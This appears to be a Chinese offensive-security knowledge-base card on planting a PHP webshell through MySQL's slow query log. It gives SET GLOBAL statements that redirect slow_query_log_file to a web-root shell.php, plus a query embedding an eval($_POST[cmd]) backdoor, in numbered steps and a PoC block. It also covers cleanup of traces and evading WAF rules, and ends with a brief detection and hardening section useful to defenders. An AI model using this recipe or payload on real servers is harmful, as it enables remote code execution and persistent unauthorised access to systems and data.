---
id: web-generic-sqli-mysql-slow-query-log-webshell
title: MySQL slow_query_log 慢查询日志写 WebShell：log_queries_not_using_indexes 把含 PHP 代码的查询原文落盘到 Web 目录
type: scenario
domain: web
path: web/generic/sqli
technique: mysql-slow-query-log-file-write-webshell
tags:
- mysql
- slow-query-log
- webshell
- file-write
- phpmyadmin
- logging
- post-exploitation
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V626
  verified_at: '2026-11-12T23:25:58+08:00'
  notes: 已通读原文并逐张核对41张图：slow_query_log_file→C:/phpStudy/WWW/shell.php、slow_query_log=on、log_queries_not_using_indexes=on 与原文SQL一致；图05访问该shell.php返回MySQL 5.5.53慢查询日志（Query_time、use mysql; SET timestamp=...、截断的select）且下方PHP 5.4.45页被执行，佐证含PHP查询落盘并解析，据此将confidence修正为high，并改正原“原文未展示访问验证”的不实表述；含PHP的SELECT为按手法补全非原文原句。dedup：与general_log卡为related非同链（记录全部查询 vs slow_query_log+log_queries_not_using_indexes），其余候选入口/产品不同，库内仅变体一句带过slow_query_log，独立成卡成立；dup-scan无涉及pair。affected_versions原文未给未设置。未验证点：未本机复现。
url: /docs/web/generic/sqli/web-generic-sqli-mysql-slow-query-log-webshell/
draft: false
kb_aliases:
- MySQL 慢查询日志写马
- slow_query_log 写 webshell
- slow_query_log_file 写文件
- log_queries_not_using_indexes 写马
- phpMyAdmin 慢查询写马
- MySQL 日志写 shell 绕过 general_log
---

## 一句话结论

拿到 MySQL 管理权限（如 phpMyAdmin 后台/弱口令）且 `general_log` 不可用时，可把 `slow_query_log_file` 指向 Web 目录、开启 `slow_query_log` 与 `log_queries_not_using_indexes`，再执行一条“不走索引且正文含 PHP 代码”的慢查询，MySQL 会把该查询原文写进日志文件，形成可访问的 WebShell。

## 原理

- `slow_query_log` 记录执行时间超过 `long_query_time` 的查询；`log_queries_not_using_indexes=on` 会把所有未使用索引的查询也记为慢查询。日志记录的是**查询语句原文**。
- `slow_query_log_file` 是全局变量，可被拥有 `SUPER`（MySQL 8 为 `SYSTEM_VARIABLES_ADMIN`）的账号改写为任意 mysqld 可写路径。
- 因此将日志文件路径设为 Web 根目录下的 `shell.php`，开启慢查询日志与“未用索引也记录”，随后执行一条未被索引优化、正文包含 `<?php ...?>` 的查询，PHP 代码就会以明文写入 `shell.php`；Web 访问即执行。
- 与 `general_log` 写马的区别：general_log 记录**所有**查询、只需 `SET GLOBAL general_log=ON`；slow_query_log 默认只记录超时查询，必须额外打开 `log_queries_not_using_indexes`（或把 `long_query_time` 调低）并构造“慢/无索引”查询，才能在 general_log 被禁用或权限受限时使用。
- 前提是数据库与 Web 同机（或日志目录与 Web 目录在同一可写文件系统），mysqld 运行用户对目标目录可写。

## 触发条件

- 已获得可执行 `SET GLOBAL` 的数据库权限（phpMyAdmin/数据库后台登录、弱口令、SQL 注入堆叠等）。
- `general_log` 被禁用或账号仅有可改 slow log 变量的权限。
- 已知 Web 根绝对路径，mysqld 对其可写；Web 服务器解析 `.php`。
- 能构造一条不含索引的查询（如对无索引列过滤、或 `SELECT ... FROM 大表 WHERE 非索引列=...`），且语句正文可包含 PHP 代码。

## 利用步骤

1. 查看慢日志相关变量：
   ```sql
   show variables like '%slow%';
   ```
2. 把日志文件指到 Web 目录并开启日志与“未用索引记录”：
   ```sql
   set GLOBAL slow_query_log_file='C:/phpStudy/WWW/shell.php';
   set GLOBAL slow_query_log=on;
   set GLOBAL log_queries_not_using_indexes=on;
   ```
3. 执行包含 PHP 代码且不走索引的查询，例如：
   ```sql
   SELECT '<?php @eval($_POST[cmd]);?>' FROM mysql.user WHERE user LIKE '%';
   ```
   （只要被判定为慢查询/未用索引，整条语句原文即写入 `shell.php`。）
4. Web 访问 `http://target/shell.php` 验证执行；若内容被前缀污染（日志头/多行），必要时调整查询使 PHP 代码可执行。
5. 清理：关闭 `slow_query_log`、改回日志路径，删除或改名 shell 文件。

## PoC

```sql
show variables like '%slow%';
set GLOBAL slow_query_log_file='C:/phpStudy/WWW/shell.php';
set GLOBAL slow_query_log=on;
set GLOBAL log_queries_not_using_indexes=on;
SELECT '<?php @eval($_POST[cmd]);?>' FROM mysql.user WHERE user LIKE '%';
```

原文在“phpMyAdmin 慢查询写马”小节给出变量设置语句后，截图显示访问 `http://192.168.52.143/shell.php` 时页面先输出 MySQL 5.5.53 慢查询日志（`Query_time`、`use mysql; SET timestamp=...` 与截断的 `select '` 查询原文），下方 PHP 5.4.45 信息页被执行，证明含 PHP 代码的查询已按慢日志格式落盘并被解析；原文未展示 phpMyAdmin 中执行变量设置的操作画面与完整 payload 查询原文，落盘语句按慢日志格式构造。实际落地时重点确认 `secure_file_priv` 不限制日志路径（日志由 mysqld 直接写，不受 `secure_file_priv` 约束，但受文件系统权限约束）。

## 变体与关联

- **general_log 版本**：[[web-generic-sqli-mysql-outfile-general-log-webshell]]（同一日志写文件思路；general_log 记录全部查询，slow_query_log 需 `log_queries_not_using_indexes`/低 `long_query_time` 触发）。
- **INTO OUTFILE/DUMPFILE**：同卡及 [[web-generic-sqli-order-by-into-outfile-filename-webshell]]；`secure_file_priv` 受限时优先日志写马。
- **入口**：phpMyAdmin 弱口令/后台登录后执行 SQL；也可来自 SQL 注入堆叠语句（`;SET GLOBAL ...`）。
- **检测绕过**：若 WAF 只拦 `general_log` 关键字，slow_query_log 系语句可绕过其规则。

## 检测与防御

- **加固**：数据库账号最小权限，业务/运维账号不授予 `SUPER`/`SYSTEM_VARIABLES_ADMIN`；`slow_query_log` 固定写入数据库专用目录且 mysqld 对 Web 目录无写权限；Web 目录禁止数据库用户写入。
- **检测**：审计日志出现 `SET GLOBAL slow_query_log_file`、`slow_query_log=on`、`log_queries_not_using_indexes=on`；Web 目录新增 `.php` 且内容含 SQL 语句；phpMyAdmin 登录后短时间执行全局变量修改。
- **排查**：发现此类语句后检查日志文件是否被指到 Web 目录、是否存在新 webshell、数据库账号是否被接管。
